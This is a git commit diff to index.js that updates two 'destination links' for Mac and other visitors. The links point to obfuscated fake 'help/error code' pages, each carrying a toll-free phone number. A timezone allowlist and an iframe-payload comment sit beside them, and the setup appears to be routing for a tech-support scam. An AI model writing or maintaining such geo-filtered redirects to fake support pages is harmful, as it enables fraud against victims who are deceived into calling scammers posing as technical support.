b200e0f1f29b28cf1d26b8c3f7ad3b86a2eb16f9
paalakash <palaksh452@gmail.com>
2026-06-23 19:50:10 +0530

    Update destination links with new phone numbers

--- index.js
+++ index.js
@@ -42,8 +42,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://meenapyy333.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
-const LINK_OTHERS = "https://meenapyy333.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
+const LINK_MAC = "https://meenapyy333.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-806-626-7757";
+const LINK_OTHERS = "https://meenapyy333.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-806-626-7757";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
